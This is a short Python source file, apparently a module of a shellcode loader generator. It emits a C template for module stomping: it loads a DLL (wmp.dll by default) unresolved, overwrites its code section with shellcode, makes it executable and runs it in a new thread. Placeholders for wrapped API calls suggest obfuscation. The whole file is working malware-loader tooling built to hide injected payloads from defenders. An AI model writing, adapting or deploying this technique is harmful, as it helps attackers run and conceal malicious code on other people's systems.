from string import Template

class modulestomp:
    def __init__(self, arguments):
        self.target = 'wmp.dll'
        if 'target' in arguments:
            self.target = arguments['target']

    def imports(self) -> list[str]:
        return ["#include <windows.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return Template("""
    {transformers}

    PBYTE dll  = (PBYTE){LoadLibraryExA}( "$target", NULL, DONT_RESOLVE_DLL_REFERENCES );
    DWORD size = IMAGE_FIRST_SECTION( dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->SizeOfRawData;
    PBYTE text = dll + IMAGE_FIRST_SECTION( dll + ( ( PIMAGE_DOS_HEADER )dll )->e_lfanew )->VirtualAddress;

    DWORD oldProt = 0;
    {VirtualProtect}( text, {shellcodeSize}, PAGE_READWRITE, &oldProt );
    memcpy( text, shellcode, {shellcodeSize} );
    {VirtualProtect}( text, {shellcodeSize}, PAGE_EXECUTE_READ, &oldProt );

    HANDLE hThread = {CreateRemoteThread}( ( HANDLE )-1, NULL, 0, (LPTHREAD_START_ROUTINE)text, NULL, 0, NULL );
    {WaitForSingleObject}(hThread, INFINITE);
""").substitute(target=self.target)